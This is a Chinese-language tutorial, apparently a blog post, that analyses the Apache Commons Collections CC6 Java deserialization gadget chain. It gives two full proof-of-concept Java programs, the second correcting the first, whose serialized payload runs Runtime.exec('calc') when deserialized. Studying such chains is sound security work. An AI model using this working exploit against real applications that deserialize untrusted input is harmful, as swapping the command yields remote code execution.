# 0x01 Preface

Java 8u71之后，CC1不能利用的主要原因是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`的逻辑发生了变化。下面介绍一条比较通用的利用链CC6

# 0x02 Analysis

CC6链子后半段还是使用CC1的`LazyMap`，由于`AnnotationInvocationHandler`因Java版本而利用受限，需要找寻其他可以调用`LazyMap#get`的地方。

INTRODUCING ~ `org.apache.commons.collections.keyvalue.TiedMapEntry`

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
    public Object getValue() {
        return map.get(key);
    }
    public Object getKey() {
        return key;
    }
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
}
```

`hashCode()` => `getValue()` => `map.get(key)`

基础篇中的URLDNS就用到了`hashCode`

```java
// HashMap#readObject
// Read the keys and values, and put the mappings in the HashMap
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();
    V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
// ====================================================================
// HashMap#hash
// 调用hash是为保证键的唯一性
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
// ====================================================================
// HashMap#put
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
}
```

`readObject()` => `hash(key)` => `key.hashCode()`

因此让**key == TiedMapEntry对象**就能接起来了。

# 0x03 Weave POC

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
        "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
        "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
        "exec", new Class[]{String.class}, new Object[]{"calc"})
};

// 假的payload
Transformer[] fakeTransformers = new Transformer[] {new
    ConstantTransformer(1)};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);
Map map = new HashMap();
Map lazyMap = LazyMap.decorate(map, transformerChain);

TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
Map expMap = new HashMap();
// put的时候也会执行hashCode，为了防止本地调试触发payload，这里放入假的payload
expMap.put(tiedMapEntry, "xxx");

// 将真正的transformers数组设置进来
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(expMap);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
Object o = (Object) ois.readObject();
```

上面的POC运行后只能执行假的payload，实际上反序列化的时候没能执行payload。

执行`Map.put()`的时候会触发`hash()`，进而牵动整条链。

再来看`LazyMap`的`get()`，由于是懒加载因此得当前map中没有key，才会调用`factory.transform(key)`生成value，再`map.put(key, value)`，这时候`lazyMap`中就有key了。（这里的key是`new TiedMapEntry`传入的key）

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

解决方法也很简单，把这个键值对从`LazyMap`中移除就行，即`lazyMap.remove("test");`

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
        "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
        "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
        "exec", new Class[]{String.class}, new Object[]{"calc"})
};

Transformer[] fakeTransformers = new Transformer[] {new
    ConstantTransformer(1)};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);
Map map = new HashMap();
Map lazyMap = LazyMap.decorate(map, transformerChain);

TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "xxx");

lazyMap.remove("test");

Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(expMap);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
Object o = (Object) ois.readObject();
```

